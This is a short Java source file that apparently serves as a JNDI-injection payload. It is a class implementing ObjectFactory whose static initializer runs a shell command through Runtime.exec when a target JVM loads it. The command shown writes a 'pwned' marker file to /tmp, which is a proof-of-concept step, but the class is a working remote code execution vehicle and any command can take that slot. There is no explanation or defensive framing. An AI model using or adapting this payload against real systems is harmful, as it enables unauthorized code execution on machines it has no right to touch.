import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class Payload implements ObjectFactory {
    static {
        try {
            Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "echo 'bambino was here' > /tmp/pwned"});
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context ctx, Hashtable<?, ?> env) {
        return null;
    }
}
